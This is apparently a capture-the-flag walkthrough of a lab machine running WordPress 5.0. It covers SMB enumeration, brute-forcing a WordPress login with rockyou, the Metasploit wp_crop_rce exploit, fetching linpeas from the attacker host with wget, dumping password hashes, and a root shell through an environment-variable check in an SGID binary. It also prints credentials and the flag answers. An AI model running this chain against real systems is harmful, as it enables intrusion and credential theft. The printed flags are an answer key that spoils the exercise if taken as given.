# Blog - Medium

```shell
sudo vim /etc/hosts
#map ip to blog.thm

nmap -T4 -p- -A -Pn -v blog.thm

smbclient -L \\\\blog.thm

smbclient \\\\blog.thm\\BillySMB
#in share

dir

#get all files
mget *

exit

#inspect the files
steghide info Alice-White-Rabbit.jpg

steghide extract -sf Alice-White-Rabbit.jpg
#does not give anything useful

feroxbuster -u http://blog.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,bak,js,txt,json,docx,pdf,zip,cgi,sh,pl,aspx,sql,xml --extract-links --scan-limit 2 --filter-status 400,401,404,405,500

cmseek
#check cms used by website
#this gives us version and user

vim wpusers.txt
#add the two usernames enumerated

wpscan --url http://blog.thm -U wpusers.txt -P /usr/share/wordlists/rockyou.txt
#cracks password for one user

msfconsole -q

search wordpress 5.0

use exploit/multi/http/wp_crop_rce

options

set RHOSTS http://blog.thm

set LHOST 10.14.31.212

set USERNAME kwheel

set PASSWORD cutiepie1

run
#run the exploit
#we get meterpreter shell

shell
#drop into a command shell

python3 -c 'import pty;pty.spawn("/bin/bash")'

whoami
#www-data

#begin basic enumeration
ls -la /var/www

ls -la /opt

ls -la /home

ls -la /home/bjoel

cat /home/bjoel/user.txt
#this does not give us user flag
#we have to look somewhere else

#we have a .pdf file in this dir
#we can download that using meterpreter
#Ctrl+C to get out of shell

download Billy_Joel_Termination_May20-2020.pdf
#inspect this in attacker machine

#get into shell again
shell

python3 -c 'import pty;pty.spawn("/bin/bash")'

ls -la /media

ls -la /media/usb
#permission denied

#we can use linpeas to check for privesc

#in attacker machine
python3 -m http.server

#in reverse shell
wget http://10.14.31.212:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

#get creds from wp-config.php

#password reuse does not work for ssh

which mysql
#we have mysql

mysql -u wordpressuser -p
#using the password, we are able to login

show databases;

select blog;

show tables;

select * from wp_users;
#dumps hashes for bjoel and kwheel

#crack hashes
vim hash.txt

hashcat -a 0 -m 400 hash.txt /usr/share/wordlists/kaonashi.txt
#this does not help
#we are unable to crack hashes for bjoel

#check the unknown SGID binary
ls -la /usr/sbin/checker
#owned by root

/usr/sbin/checker
#prints 'Not an Admin'

#check the binary
strace /usr/sbin/checker

ltrace /usr/sbin/checker

#ltrace shows that the binary looks for 'admin' var

env
#there is no environment var named 'admin'

export admin=1

echo $admin

/usr/sbin/checker
#we get root shell
```

* Open ports & services:

  * 22 - ssh - OpenSSH 7.6p1 (Ubuntu)
  * 80 - tcpwrapped
  * 139 - netbios-ssn
  * 445 - microsoft-ds - Samba smbd 4.7.6

* We can start enumeration of SMB shares using ```smbclient``` - there is a share that can be accessed by us.

* The share contains a .jpg file, a .mp4 file and a .png file - we can use ```mget``` to transfer all files, and inspect them in our machine.

* We can use stego tools for the files, but we do not get anything useful.

* We can now start exploring and enumerating the webpage on port 80; it is a blog page.

* ```feroxbuster``` gives us certain directories that make it seem like the blog page is using ```Wordpress```.

* One of the blogs mentions 'WordPress', so we can confirm the CMS used.

* Also, the blog-post titled 'A Note From Mom' contains two comments from users, 'Billy Joel' and 'Karen Wheeler'.

* Now, we can use ```cmseek``` to detect CMS version and other info.

* Using this tool, we find that WordPress version 5.0 is being used.

* Furthermore, it shows two usernames, 'bjoel' and 'kwheel'.

* We can use ```wpscan``` tool to attempt bruteforce with these two usernames; the tool is able to identify the theme 'twentytwenty'.

* With the bruteforce attack running in background, we can search for exploits related to WordPress 5.0

* Googling this version shows an 'image RCE' exploit for Wordpress 5.0, and we have several exploit scripts.

* In the ```wpscan``` bruteforce attack, after a while, we get creds kwheel:cutiepie1

* We can use these creds for the exploit found on ```Metasploit``` - we will be using the 'wp_crop_rce' exploit.

* Configuring & running the exploit gives us a Meterpreter shell - we can drop into a command shell.

* Now, we can begin with basic enumeration - searching common directories like /opt, /var/www and /home

* In bjoel's home directory, we have user.txt, but this does not provide user flag.

* We also have a .pdf file here; we can transfer this using Meterpreter shell's ```download``` option, for which we will have to exit shell.

* We can inspect the .pdf file before getting into another command shell again.

* Now, the .pdf file mentions the company 'Rubber Ducky' and why it is terminating Billy; it also mentions 'removable media', so we can look into that.

* We can use this as a clue to check the /media directory - but we do not have enough permissions.

* We can use ```linpeas``` to check for privesc.

* We find the creds "wordpressuser:LittleYellowLamp90!@" in wp-config.php - we can attempt to check for password reuse, but this password does not work for SSH login.

* We can attempt to use this password for ```mysql``` login - it works.

* Now, ```mysql``` contains a database ```blog```, which includes a ```wp_users``` table, and this contains two hashes for the two users.

* Now, these hashes are Wordpress hashes; we can attempt to crack this using ```hashcat```.

* We are unable to crack the hashes for 'bjoel'; we can continue enumeration.

* Now, going through the ```linpeas``` output, we have an unknown SGID binary called 'checker' - we can attempt to run that.

* Running the binary prints 'Not an Admin'; we can further explore the binary using ```ltrace``` and ```strace```.

* Now, running ```ltrace``` shows that it uses ```getenv```, which gets the value of an environment variable; this binary checks for env 'admin'

* Checking the environment variables, we do not have any 'admin' variable, so we can create one with the value of 1.

* Now, if we run the binary, we get a root shell - we can get both flags now.

```markdown
1. root.txt - 9a0b2b618bef9bfa7ac28c1353d9f318

2. user.txt - c8421899aae571f7af486492b71a8ab7

3. Where was user.txt found? - /media/usb

4. What CMS was Billy using? - wordpress

5. What version of the above CMS was being used? - 5.0
```
